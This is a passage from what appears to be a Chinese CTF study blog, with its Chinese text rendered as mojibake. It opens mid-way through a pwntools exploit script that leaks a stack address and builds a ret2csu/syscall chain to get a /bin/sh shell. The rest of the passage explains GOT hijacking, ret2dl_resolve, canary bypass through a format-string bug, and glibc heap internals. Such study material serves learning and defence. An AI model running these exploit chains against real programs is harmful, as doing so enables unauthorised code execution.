= <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">vul_addr = <span class="number">0x4004ed</span></span><br><span class="line">main_addr = <span class="number">0x40051d</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4005a3</span></span><br><span class="line">csu_front_addr = <span class="number">0x40059A</span></span><br><span class="line">csu_end_addr = <span class="number">0x400580</span></span><br><span class="line">ret_addr = <span class="number">0x400519</span></span><br><span class="line">sys_call = <span class="number">0x400517</span></span><br><span class="line">mov_rax_59 = <span class="number">0x4004E2</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b'/bin/sh\x00'</span>*<span class="number">2</span> + p64(vul_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">io.send(payload1)</span><br><span class="line">io.recv(<span class="number">0x20</span>)</span><br><span class="line">leak_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line"><span class="comment">#æ³„éœ²å‡ºæ¥argvçš„åœ°å€</span></span><br><span class="line">log.info(<span class="string">'leaked_addr===&gt;'</span>+hex(leak_addr))</span><br><span class="line"><span class="comment">#print("----------&gt;",hex(leak_addr - 0x118))</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">bin_sh = leak_addr - <span class="number">0x128</span></span><br><span class="line"><span class="comment">#ç”¨åç§»é€šè¿‡argvæ‰¾åˆ°binshåœ°å€</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'/bin/sh\x00'</span>*<span class="number">2</span> + p64(mov_rax_59) + p64(csu_front_addr)</span><br><span class="line"><span class="comment">#ebpå¤„æ”¾ç»™å¯„å­˜å™¨raxèµ‹å€¼çš„åœ°å€</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(bin_sh+<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#è¿™é‡Œå°±æ˜¯å·§å¦™çš„æ‰§è¡Œåˆ©ç”¨ï¼Œrbx ä¸ r12æ‰§è¡Œäº†mov_rax_59çš„æ“ä½œ</span></span><br><span class="line"><span class="comment">#bin_sh+0x10çš„ä½ç½®æ”¾å¾—æ˜¯æ‰§è¡Œmov rax 59 åœ°å€çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯rbpæ­¤æ—¶æŒ‡å‘çš„åœ°å€</span></span><br><span class="line"><span class="comment">#åé¢çš„ä¸‰ä¸ª0æ˜¯ç»™execvå‡½æ•°ä¼ å‚ï¼Œ/bin/shåœ¨4å­—èŠ‚çš„ediä¸­æ”¾ä¸ä¸‹ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å…ˆä¼ 0ï¼Œä¸‹é¢å†pop_rdi</span></span><br><span class="line">payload += p64(csu_end_addr)</span><br><span class="line">payload += <span class="number">0x38</span>*<span class="string">b'A'</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bin_sh) + p64(sys_call)</span><br><span class="line"><span class="comment">#å¯„å­˜å™¨è¢«èµ‹å€¼ä¹‹åæ‰§è¡Œsyscallï¼Œå®ƒä¼šè‡ªåŠ¨åŒ¹é…è¦æ‰§è¡Œexecvï¼Œç„¶åå›å»64ä½å¯¹åº”çš„å¯„å­˜å™¨é‡Œé¢æ‰¾å‚æ•°</span></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<ul>
<li>å¯ä»¥åˆ©ç”¨çš„csu</li>
</ul>
<h2 id=""><a href="#" class="headerlink" title=""></a><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/../../../../Desktop/ctf_huzai/win/writeup/pic/QQ%E6%88%AA%E5%9B%BE20201118220313.png" alt=""></h2><ul>
<li>ç”¨gdb+pwn è¿›è¡ŒåŠ¨æ€è°ƒè¯•,å¾—åˆ°å‡½æ•°æ ˆä¸­çš„çŠ¶æ€ä¸payloadçš„å¯¹åº”å…³ç³»,å¦‚ä¸‹</li>
</ul>
<p>  <img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/buuoj_00039.png" alt=""></p>
<p>  <img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/buuoj_00038.png" alt=""></p>
<h4 id="4-hijiack-got-â€“-ä¿®æ”¹æŸä¸ªè¢«è°ƒç”¨å‡½æ•°çš„åœ°å€-è®©å…¶æŒ‡å‘å¦ä¸€ä¸ªåœ°å€"><a href="#4-hijiack-got-â€“-ä¿®æ”¹æŸä¸ªè¢«è°ƒç”¨å‡½æ•°çš„åœ°å€-è®©å…¶æŒ‡å‘å¦ä¸€ä¸ªåœ°å€" class="headerlink" title="4.hijiack got â€“ ä¿®æ”¹æŸä¸ªè¢«è°ƒç”¨å‡½æ•°çš„åœ°å€,è®©å…¶æŒ‡å‘å¦ä¸€ä¸ªåœ°å€"></a>4.hijiack got â€“ ä¿®æ”¹æŸä¸ªè¢«è°ƒç”¨å‡½æ•°çš„åœ°å€,è®©å…¶æŒ‡å‘å¦ä¸€ä¸ªåœ°å€</h4><ul>
<li><p>åŠ¨æ€é“¾æ¥ä¸é™æ€é“¾æ¥</p>
<ul>
<li>é™æ€é“¾æ¥<ul>
<li>æŠŠéœ€è¦è°ƒç”¨çš„å‡½æ•°æˆ–è€…è¿‡ç¨‹é“¾æ¥åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­,æˆä¸ºå¯æ‰§è¡Œæ–‡ä»¶çš„ä¸€éƒ¨åˆ†,ä½¿å¾—æ–‡ä»¶åŒ…å«è¿è¡Œæ—¶çš„å…¨éƒ¨ä»£ç ,å½“å¤šä¸ªç¨‹åºè°ƒç”¨ç›¸åŒå‡½æ•°æ—¶,å†…å­˜ä¸­å°±ä¼šå‡ºç°å¤šä¸ªè¿™ä¸ªå‡½æ•°çš„æ‹·è´,æµªè´¹å†…å­˜</li>
</ul>
</li>
<li>åŠ¨æ€é“¾æ¥<ul>
<li>ä»…ä»…åœ¨è°ƒç”¨å¤„åŠ å…¥äº†æ‰€è°ƒç”¨å‡½æ•°çš„æè¿°ä¿¡æ¯(å¾€å¾€æ˜¯ä¸€äº›é‡å®šä½ä¿¡æ¯),å½“ç¨‹åºè¿è¡Œæ—¶,æ‰å›å»åŠ¨æ€çš„é“¾æ¥åˆ°ç›¸åº”çš„å‡½æ•°,åŠ¨æ€é“¾æ¥åº“çš„æ–‡ä»¶åç¼€ä¸º.so</li>
<li><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201030075922270.png" alt=""></li>
</ul>
</li>
</ul>
</li>
<li><p>GOTä¸PLT</p>
<ul>
<li><p>GOT(global offset table) å…¨å±€åç§»é‡è¡¨,ç”¨æ¥å‚¨å­˜å¤–éƒ¨å‡½æ•°åœ¨å†…å­˜çš„ç¡®åˆ‡åœ°å€</p>
</li>
<li><p>PLT(procedure linkage table) ç¨‹åºé“¾æ¥è¡¨,ç”¨æ¥å­˜å‚¨å¤–éƒ¨å‡½æ•°çš„å…¥å£ç‚¹</p>
</li>
<li><p>ç¬¬ä¸€æ¬¡è°ƒç”¨å‡½æ•°æ—¶è§£æå‡½æ•°åœ°å€å¹¶å­˜å…¥GOTè¡¨</p>
<ul>
<li><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201029154651550.png" alt=""></li>
</ul>
</li>
<li><p>ç¬¬äºŒæ¬¡è°ƒç”¨å‡½æ•°ç›´æ¥è¯»å–GOTä¸­çš„åœ°å€</p>
<ul>
<li><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201029154754376.png" alt=""></li>
</ul>
</li>
<li><p>æ•´ä¸ªè°ƒç”¨çš„è¿‡ç¨‹</p>
<ul>
<li><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201030080054235.png" alt=""></li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>å¦‚ä½•ç¡®å®šå‡½æ•°Aåœ¨GOTè¡¨ä¸­çš„ä½ç½®?</p>
<ul>
<li>ç¨‹åºè°ƒç”¨å‡½æ•°æ˜¯é€šè¿‡PLTè¡¨è·³è½¬åˆ°GOTè¡¨çš„å¯¹åº”æ¡ç›®,åœ¨æ±‡ç¼–æŒ‡ä»¤ä¸­æ‰¾åˆ°è¯¥å‡½æ•°åœ¨PLTä¸­çš„å…¥å£ç‚¹ä½ç½®,ä»è€Œå®šä½åˆ°è¯¥å‡½æ•°åœ¨GOTä¸­ çš„æ¡ç›®</li>
</ul>
</li>
<li><p>å¦‚ä½•ç¡®å®šå‡½æ•°Båœ¨å†…å­˜ä¸­çš„ä½ç½®?</p>
<ul>
<li>å‡½æ•°åœ¨åŠ¨æ€é“¾æ¥åº“ä¸­çš„ä½ç½®æ˜¯ç›¸å¯¹å›ºå®šçš„.å¦‚æœçŸ¥é“äº†å‡½æ•°Açš„è¿è¡Œåœ°å€(è¯»å–GOTè¡¨ä¸­çš„å†…å®¹),ä¹ŸçŸ¥é“Aå’ŒBåœ¨åŠ¨æ€é“¾æ¥åº“ä¸­çš„ç›¸å¯¹ä½ç½®,å°±å¯ä¸€æ¨æ–­å‡ºBçš„è¿è¡Œæ—¶åœ°å€</li>
</ul>
</li>
<li><p>å¦‚ä½•å®ç°GOTè¡¨ä¸­çš„æ•°æ®ä¿®æ”¹?</p>
<ul>
<li>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</li>
</ul>
</li>
</ul>
<h4 id="5-Return-to-dl-resolve"><a href="#5-Return-to-dl-resolve" class="headerlink" title="5.Return-to-dl_resolve"></a>5.Return-to-dl_resolve</h4><ul>
<li>æ ¸å¿ƒæ€æƒ³æ˜¯åˆ©ç”¨dl_runtime_resolveå‡½æ•°è§£æå‡ºsystemå‡½æ•°çš„åœ°å€,é€šå¸¸åœ¨æ²¡æœ‰æä¾›libå‡½åº“çš„æƒ…å†µä¸‹ä½¿ç”¨.</li>
<li>ä½¿ç”¨æ¡ä»¶<ul>
<li>æœªç»™å‡ºlibcåº“</li>
<li>æ²¡æœ‰å¼€å¯PIEä¿æŠ¤,å¦‚æœå¼€å¯PIEéœ€è¦é€šè¿‡æ³„æ¼è·å–åŸºåœ°å€</li>
<li>æ²¡æœ‰å¼€å¯FULL RELOAD</li>
<li></li>
</ul>
</li>
</ul>
<h3 id="3-payloadä¸å‡½æ•°è°ƒç”¨æ ˆçš„å…³ç³»"><a href="#3-payloadä¸å‡½æ•°è°ƒç”¨æ ˆçš„å…³ç³»" class="headerlink" title="3. payloadä¸å‡½æ•°è°ƒç”¨æ ˆçš„å…³ç³»"></a>3. payloadä¸å‡½æ•°è°ƒç”¨æ ˆçš„å…³ç³»</h3><ul>
<li>payloadçš„é•¿åº¦å¯ä»¥ç”¨ payload.ljust(0x105,bâ€™aâ€™)è¿›è¡Œå¡«å……,ä½¿å¾—å¡«å……åçš„payloadçš„æ€»é•¿åº¦ä¸º0x106 Bytes </li>
<li><p>âš ï¸p32(0xdeadbeef) å 4ä¸ªByte</p>
</li>
<li><p>paylaodçš„å®é™…æ„ä¹‰æ˜¯é€šè¿‡è¾“å…¥çš„æº¢å‡º,å°†æˆ‘ä»¬éœ€è¦çš„æŒ‡ä»¤é€åˆ°ipè®©cpuæ‰§è¡Œ</p>
<ul>
<li>ä¸‹å›¾æ˜¯64ä½,ä¸­çš„å¯¹åº”å…³ç³»</li>
</ul>
</li>
</ul>
<p><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201106110733512.png" alt=""></p>
<p>â€‹            ç»è¿‡gdb+pwnè°ƒè¯•ï¼Œå¾—åˆ°æ­£ç¡®çš„å…³ç³»ï¼Œmainå®é™…ä¸Šæ˜¯è¿”å›å€¼</p>
<p>â€‹            <img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/payload64.png" alt=""></p>
<ul>
<li><p>ä¸‹å›¾æ˜¯32ä½ä¸­çš„å¯¹åº”å…³ç³»</p>
<p><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201106172618456.png" alt=""></p>
</li>
</ul>
<h3 id="4-é€šç”¨çš„gadget"><a href="#4-é€šç”¨çš„gadget" class="headerlink" title="4.é€šç”¨çš„gadget"></a>4.é€šç”¨çš„gadget</h3><h5 id="libc-csu-init"><a href="#libc-csu-init" class="headerlink" title="__libc_csu_init()"></a>__libc_csu_init()</h5><ul>
<li><p>åœ¨ç¨‹åºç¼–è¯‘çš„è¿‡ç¨‹ä¸­,ä¼šè‡ªåŠ¨åŠ å…¥ä¸€äº›é€šç”¨å‡½æ•°çš„åˆå§‹åŒ–å·¥ä½œ,è¿™äº›åˆå§‹åŒ–å‡½æ•°éƒ½æ˜¯ç›¸åŒçš„,å› æ­¤å¯ä»¥è€ƒè™‘åœ¨è¿™äº›å‡½æ•°ä¸­æ‰¾åˆ°ä¸€äº›é€šç”¨çš„gadget</p>
<ul>
<li><p>éœ€è¦å…³æ³¨çš„å¯„å­˜å™¨</p>
<ul>
<li><p>r12  ä¿å­˜ç€å°†è¦è°ƒç”¨å‡½æ•°çš„æŒ‡é’ˆçš„åœ°å€</p>
</li>
<li><p>rcx  r8  r9  ç¬¬å››äº”å…­ä¸ªå‚æ•°</p>
</li>
<li><p>rdx   ç¬¬ä¸‰ä¸ªå‚æ•°</p>
</li>
<li><p>rsi    ç¬¬äºŒä¸ªå‚æ•°</p>
</li>
<li><p>rdi   ç¬¬ä¸€ä¸ªå‚æ•°</p>
</li>
<li><p>rbx å’Œ rbp çš„å€¼åˆ†åˆ«ä¸º0 1 </p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="5-Canary"><a href="#5-Canary" class="headerlink" title="5.Canary"></a>5.Canary</h3><ul>
<li><p>linuxä¸­çš„cookies,ç”¨æ¥æ£€æµ‹æº¢å‡ºå¹¶é˜»æ­¢æº¢å‡ºæ“ä½œ</p>
</li>
<li><p>å…¶åŸç†æ˜¯å½“ç¨‹åºå¯ç”¨canaryç¼–è¯‘å,åœ¨å‡½æ•°åºè¨€éƒ¨åˆ†ä¼šå–fså¯„å­˜å™¨0x20å¤„çš„å€¼.å­˜æ”¾åœ¨æ ˆä¸­</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov qword ptr [rbp-8], rax</span><br></pre></td></tr></table></figure>
</li>
<li><p>åœ¨å‡½æ•°è¿”å›ä¹‹å‰,ä¼šå°†è¯¥å€¼å–å‡º,å¹¶ä¸fs:0x28çš„å€¼è¿›è¡Œäº¦æˆ–.è¿™ä¸ªæ“ä½œæ—¢æ£€æµ‹æ˜¯å¦å‘ç”Ÿæ ˆæº¢å‡º</p>
</li>
<li><p>å¦‚æœcanaryå·²ç»è¢«éæ³•ä¿®æ”¹,æ­¤æ—¶ç¨‹åºæµç¨‹ä¼šèµ°åˆ°__stack_chk_fail</p>
<p><img src="/2020/12/12/PWN-ç¼“å†²åŒºæº¢å‡ºåŸç†/image-20201104214925462.png" alt=""></p>
</li>
</ul>
<ul>
<li><p>é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²ç»•è¿‡canary</p>
<ul>
<li>ç”±äºæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä¼šå¯¼è‡´ä»»æ„åœ°å€æ³„æ¼,å› æ­¤,åªè¦å¾—åˆ°è¾“å…¥å‚æ•°åœ¨æ ˆä¸­çš„ä½ç½®,å°±å¯ä»¥é€šè¿‡åç§»å¾—åˆ°canaryåœ¨æ ˆä¸­çš„ä½ç½®</li>
<li>ç„¶ååœ¨æ ˆæº¢å‡ºçš„paddingå—æŠŠcanaryæ‰€åœ¨çš„ä½ç½®çš„å€¼ç”¨æ­£ç¡®çš„canaryæ›¿æ¢,ä»è€Œç»•è¿‡canaryæ£€æµ‹</li>
</ul>
</li>
</ul>

      
    </div>
    
      <div class="full-width auto-padding tags">
        
          <a href="/tags/PWN-CTF/" rel="nofollow"><i class="fas fa-hashtag fa-fw"></i>PWN CTF</a>
        
      </div>
    
  </section>
</article>

          </div>
        
      
        
          <div class="post-wrapper">
            <article class="post reveal ">
  


  <section class="meta">
    
    
    <div class="meta" id="header-meta">
      
        
  <h2 class="title">
    <a href="/2020/12/12/PWN-å †ç›¸å…³çš„æ¼æ´/">
      PWN-å †ç›¸å…³çš„æ¼æ´
    </a>
  </h2>


      
      <div class="new-meta-box">
        
          
        
          
            
  <div class="new-meta-item author">
    <a href="http://yoursite.com" rel="nofollow">
      
        <i class="fas fa-user" aria-hidden="true"></i>
      
      <p>John Doe</p>
    </a>
  </div>


          
        
          
            <div class="new-meta-item date">
  <a class="notlink">
    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
    <p>2020-12-12</p>
  </a>
</div>

          
        
          
            

          
        
          
            

          
        
          
            

          
        
      </div>
      
        <hr>
      
    </div>
  </section>


  <section class="article typo">
    <div class="article-entry" itemprop="articleBody">
      <h2 id="ä¸‰ã€å †ç›¸å…³çš„æ¼æ´"><a href="#ä¸‰ã€å †ç›¸å…³çš„æ¼æ´" class="headerlink" title="ä¸‰ã€å †ç›¸å…³çš„æ¼æ´"></a>ä¸‰ã€å †ç›¸å…³çš„æ¼æ´</h2><h3 id="1-å †ä»‹ç»"><a href="#1-å †ä»‹ç»" class="headerlink" title="1.å †ä»‹ç»"></a>1.å †ä»‹ç»</h3><ul>
<li>ç»“æ„ç¤ºæ„å›¾<ul>
<li><img src="/2020/12/12/PWN-å †ç›¸å…³çš„æ¼æ´/image-20201117102955545.png" alt="image-20201117102955545"></li>
<li>Nä½ï¼šdefine NON_MAIN_ARENA ç”¨äºè¡¨ç¤ºæ˜¯å¦å±äºä¸»çº¿ç¨‹ï¼Œ0è¡¨ç¤ºä¸»çº¿ç¨‹çš„å †å—ç»“æ„ï¼Œ1è¡¨ç¤ºå­çº¿ç¨‹çš„å †å—ç»“æ„</li>
<li>Mä½ï¼šdefine IS_MAPPED 0X2 ç”¨äºè¡¨ç¤ºæ˜¯å¦ç”±mmapåˆ†é…ï¼Œ0è¡¨ç¤ºç”±å †å—ä¸­çš„top chunkåˆ†è£‚äº§ç”Ÿï¼Œ1è¡¨ç¤ºç”±mmapåˆ†é…</li>
<li>Pä½ï¼šdefine PREV_ISUSE 0x1 ç”¨äºè¡¨ç¤ºä¸Šä¸€å †å—æ˜¯å¦å¤„äºç©ºé—²çŠ¶æ€ï¼Œ0è¡¨ç¤ºå¤„äºç©ºé—²çŠ¶æ€ï¼Œ1è¡¨ç¤ºå¤„äºä½¿ç”¨çŠ¶æ€ã€‚ä¸»è¦ç”¨äºæ¥åˆ¤æ–­freeæ˜¯å¦èƒ½å¤Ÿä¸Šä¸€å †å—è¿›è¡Œåˆå¹¶</li>
</ul>
</li>
<li>å †ç©ºé—²å—ç®¡ç†ç»“æ„bin<ul>
<li>å½“allocated chunkè¢«é‡Šæ”¾ä»¥åï¼Œä¼šæ”¾å…¥binæˆ–è€…top chunkä¸­å»ã€‚binçš„ä½œç”¨æ˜¯åŠ å¿«åˆ†é…é€Ÿåº¦ï¼Œå…¶é€šè¿‡é“¾è¡¨æ–¹å¼ï¼ˆchunkç»“æ„ä½“ä¸­çš„fdå’ŒbkæŒ‡é’ˆï¼‰è¿›è¡Œç®¡ç†</li>
<li>fast bin<ul>
<li>å•é“¾è¡¨ç»“æ„è¿›è¡Œç»„ç»‡ï¼Œç”¨fdæŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€å †å—ï¼Œé‡‡ç”¨LIFOæœºåˆ¶</li>
<li>å®ƒå°†å †å—çš„pæ ‡å¿—ä¸ºéƒ½è®¾ä¸º1ï¼Œå¤„äºå ç”¨çŠ¶æ€ï¼Œä»¥é˜²æ­¢é‡Šæ”¾æ—¶fast binè¿›è¡Œåˆå¹¶ï¼Œç”¨äºå¿«é€Ÿåˆ†é…å°å†…å­˜</li>
</ul>
</li>
</ul>
</li>
<li>mallocåŸºæœ¬è§„åˆ™<ul>
<li>å°†ç”³è¯·sizeæŒ‰ç…§ä¸€å®šçš„è§„åˆ™å¯¹é½ï¼Œå¾—åˆ°æœ€ç»ˆè¦åˆ†é…çš„å¤§å°size_real<ul>
<li>X86:size+4 æŒ‰ç…§0x10å­—èŠ‚å¯¹é½</li>
<li>X64ï¼šsize+8æŒ‰ç…§0x20å­—èŠ‚å¯¹é½</li>
</ul>
</li>
<li>æ£€æŸ¥size_real æ˜¯å¦ç¬¦åˆfast bin çš„å¤§å°ï¼Œè‹¥æ˜¯åˆ™æŸ¥çœ‹fast binä¸­å¯¹åº”çš„size_real çš„é‚£æ¡é“¾è¡¨ä¸­æ˜¯å¦å­˜åœ¨å †å—ï¼Œè‹¥æ˜¯åˆ™åˆ†é…ï¼Œå¦åˆ™è¿›è¡Œä¸‹ä¸€æ­¥</li>
<li>æ£€æŸ¥size-real æ˜¯å¦ç¬¦åˆsmall bin çš„å¤§å°ï¼Œè‹¥æ˜¯åˆ™æŸ¥çœ‹fast binä¸­å¯¹åº”çš„size_real çš„é‚£æ¡é“¾è¡¨ä¸­æ˜¯å¦å­˜åœ¨å †å—ï¼Œè‹¥æ˜¯åˆ™åˆ†é…ï¼Œå¦åˆ™è¿›è¡Œä¸‹ä¸€æ­¥</li>
<li>æ£€æŸ¥size-real æ˜¯å¦ç¬¦åˆlarge bin çš„å¤§å°ï¼Œè‹¥æ˜¯åˆ™è°ƒç”¨malloc_consolidateå‡½æ•°å¯¹fast binä¸­æ‰€æœ‰å †å—è¿›è¡Œåˆå¹¶ï¼Œå…¶è¿‡ç¨‹ä¸ºå°†fast binä¸­çš„å †å—å–å‡ºï¼Œæ¸…é™¤ä¸‹ä¸€å—çš„pæ ‡è¯†ä½å¹¶è¿›è¡Œå †å—åˆå¹¶ï¼Œå°†æœ€ç»ˆçš„å †å—æ”¾å…¥unsorted binã€‚ç„¶ååœ¨small bin å’Œlarge binä¸­æ‰¾åˆ°åˆé€‚size_realå¤§å°çš„å—ã€‚è‹¥æ‰¾åˆ°åˆ™åˆ†é…ï¼Œå¹¶å°†å¤šä½™çš„éƒ¨åˆ†æ”¾å…¥unsorted bin ï¼Œå¦åˆ™ä¸‹ä¸€æ­¥</li>
<li>æ£€æŸ¥top chunkçš„å¤§å°æ˜¯å¦ç¬¦åˆsize_realçš„å¤§å°ï¼Œè‹¥æ˜¯åˆ™åˆ†é…å‰é¢ä¸€éƒ¨åˆ†ï¼Œå¹¶é‡æ–°è®¾ç½®top chunkï¼Œå¦åˆ™è°ƒç”¨malloc_consolidateå‡½æ•°å¯¹fast binä¸­æ‰€æœ‰çš„å †å—è¿›è¡Œåˆå¹¶ï¼Œè‹¥ä¾ç„¶ä¸å¦ï¼Œåˆ™å€ŸåŠ©ç³»ç»Ÿè°ƒç”¨æ¥å¼€è¾Ÿæ–°çš„ç©ºé—´è¿›è¡Œåˆ†é…ï¼Œè‹¥è¿˜æ˜¯ä¸æ»¡è¶³ï¼Œåˆ™è¿”å›å¤±è´¥</li>
</ul>
</li>
<li>free åŸºæœ¬è§„åˆ™<ul>
<li>é¦–å…ˆä¼šæ£€æŸ¥åœ°å€æ˜¯å¦å¯¹é½,å¹¶æ ¹æ®sizeæ‰¾åˆ°ä¸‹ä¸€å—çš„ä½ç½®,æ£€æŸ¥å…¶pæ ‡è¯†ä½æ˜¯å¦ä¸º1</li>
<li>æ£€æŸ¥é‡Šæ”¾å—çš„sizeæ˜¯å¦ç¬¦åˆfastbinçš„å¤§å°åŒºé—´,è‹¥æ˜¯åˆ™ç›´æ¥æ”¾å…¥fast bin,å¹¶ä¿æŒä¸‹ä¸€å †å—ä¸­çš„pæ ‡è¯†ä½ä¸º1ä¸å˜(è¿™æ ·å¯ä»¥é¿å…åœ¨å‰åå—é‡Šæ”¾æ—¶è¿›è¡Œå †å—çš„åˆå¹¶,ä»¥æ–¹ä¾¿å¿«é€Ÿåˆ†é…å°å†…å­˜),å¦åˆ™è¿›è¡Œä¸‹ä¸€æ­¥</li>
<li>è‹¥æœ¬å †å—sizeåŸŸä¸­çš„pæ ‡è¯†ä½ä¸º0(å‰ä¸€å †å—å¤„äºé‡Šæ”¾çŠ¶æ€)åˆ™åˆ©ç”¨æœ¬å¿«çš„pre_sizeæ‰¾åˆ°å‰ä¸€å †å—çš„å¼€å¤´,å°†å…¶ä»biné“¾è¡¨ä¸­æ‘˜é™¤(unlink),å¹¶åˆå¹¶è¿™ä¸¤ä¸ªå—,å¾—åˆ°æ–°çš„é‡Šæ”¾å—</li>
<li>æ ¹æ®sizeæ‰¾åˆ°ä¸‹ä¸€å †å—,å¦‚æœæ˜¯top chunk,åˆ™ç›´æ¥åˆå¹¶åˆ°top chunkä¸­,ç›´æ¥è¿”å›.å¦åˆ™æ£€æŸ¥æœ€åä¸€å †å—æ˜¯å¦å¤„äºé‡Šæ”¾çŠ¶æ€(é€šè¿‡æ£€æŸ¥ä¸‹ä¸€å †å—çš„pæ ‡è¯†ä½æ˜¯å¦ä¸º0).å°†å…¶ä»biné“¾è¡¨ä¸­æ‘˜é™¤(unlink),å¹¶åˆå¹¶è¿™ä¸¤å—,å¾—åˆ°æ–°çš„é‡Šæ”¾å—.</li>
<li>å°†ä¸Šè¿°åˆå¹¶å¾—åˆ°çš„æœ€ç»ˆå †å—æ”¾å…¥unstorted binä¸­å»</li>
</ul>
</li>
<li>tcache<ul>
<li>ä½œç”¨<ul>
<li>æé«˜å †çš„ä½¿ç”¨æ•ˆç‡</li>
</ul>
</li>
<li>æ³¨æ„ç‚¹<ul>
<li>tcacheçš„ç®¡ç†æ˜¯å•é“¾è¡¨,é‡‡ç”¨LIFOåŸåˆ™</li>
<li>tcacheçš„ç®¡ç†ç»“æ„å­˜åœ¨äºå †ä¸­,é»˜è®¤æœ‰64ä¸ªentry,æ¯ä¸ªentryæœ€å¤šå­˜æ”¾7ä¸ªchunk</li>
<li>tcacheçš„nextæŒ‡é’ˆæŒ‡å‘chunkçš„æ•°æ®åŒº</li>
<li>tcacheçš„æŸä¸ªentryè¢«å æ»¡ä»¥å,ç¬¦åˆè¯¥entryå¤§å°çš„chunkè¢«freeåçš„è§„åˆ™å’ŒåŸæœ‰æœºåˆ¶ç›¸åŒ</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="2-ç›¸å…³çš„æ•°æ®ç»“æ„"><a href="#2-ç›¸å…³çš„æ•°æ®ç»“æ„" class="headerlink" title="2. ç›¸å…³çš„æ•°æ®ç»“æ„"></a>2. ç›¸å…³çš„æ•°æ®ç»“æ„</h3><h4 id="å¾®è§‚ç»“æ„"><a href="#å¾®è§‚ç»“æ„" class="headerlink" title="å¾®è§‚ç»“æ„"></a>å¾®è§‚ç»“æ„</h4><h5 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h5><p>ç»“æ„</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a "view" into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h5 id="Bin"><a href="#Bin" class="headerlink" title="Bin"></a>Bin</h5><ul>
<li><p>ptmalloc æ ¹æ®chunkçš„å¤§å°ä»¥åŠä½¿ç”¨çŠ¶æ€å°†chunkåˆ†ä¸º4ç±»:fast bin, small bin, large bin, unstorted bin</p>
</li>
<li><p>ä¸€ä¸ªbinç›¸å½“äºä¸€ä¸ªchunké“¾è¡¨</p>
</li>
